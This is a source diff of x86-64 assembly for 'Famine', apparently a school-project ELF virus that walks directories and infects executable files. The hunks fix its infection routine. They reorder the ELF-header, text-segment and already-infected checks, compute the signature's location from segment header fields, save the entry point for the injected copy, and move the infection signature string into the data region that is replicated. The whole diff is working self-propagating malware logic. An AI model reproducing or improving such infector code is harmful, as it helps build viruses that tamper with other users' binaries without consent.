@@ -42,6 +42,8 @@ sc:
 				mov				qword[rsp+0xc70+24],	rax
 				mov				rax,					qword[rel sc_child]
 				mov				qword[rsp+0xc78+24],	rax
+				mov				rax,					qword[rel sc_entry]
+				mov				qword[rsp+0xc80+24],	rax
 
 				lea				rdi,					[rel sc_dir_1]
 				call			sc_proc_dir
@@ -59,7 +61,7 @@ sc:
 				je				.parent
 				
 				lea				r8,						[rel sc]
-				sub				r8,						qword[rel sc_entry]
+				sub				r8,						qword[rsp+0xc80]
 				add				rax,					r8
 .parent:
 				mov				rsp,					rbp
@@ -139,13 +141,13 @@ sc_proc_entries:
 				mov				rdx,					qword[rbx+0xc60]
 				mov				qword[rbx+0x48],		rdx
 
-				call			sc_check_infection
-				cmp				rax,					0
-				jl				.unmap
 				call			sc_test_elf_hdr
 				cmp				rax,					0
 				jl				.unmap
 				call			sc_find_txt_seg
+				cmp				rax,					0
+				jl				.unmap
+				call			sc_check_infection
 				cmp				rax,					0
 				jl				.unmap
 
@@ -306,11 +308,11 @@ sc_find_txt_seg:
 sc_check_infection:
 				mov				r8,						qword[rel sc_glob]
 
-				cmp				qword[r8+0x18],			49
-				jb				.error
-
 				mov				rdi,					qword[r8+0xc60]
-				add				rdi,					qword[r8+0x18]
+				mov				r9,						qword[r8+0x50]
+				add				rdi,					qword[r9+0x8]
+				add				rdi,					qword[r9+0x20]
+				add				rdi,					qword[r8+0x30]
 				sub				rdi,					49
 				lea				rsi,					[rel sc_sign]
 				mov				rdx,					49
@@ -635,8 +637,6 @@ sc_entry:
 				dq				sc
 sc_real_entry:
 				dq				sc_first_real_entry
-sc_sign:
-				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_ident:
 				db				0x7f, "ELF", 0x2
 sc_child:
@@ -661,6 +661,9 @@ sc_glob:
 									; +0xc68 -> x_pad
 									; +0xc70 -> real_entry
 									; +0xc78 -> child
+									; +0xc80 -> entry
+sc_sign:
+				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_data_end:
 
 sc_first_real_entry:
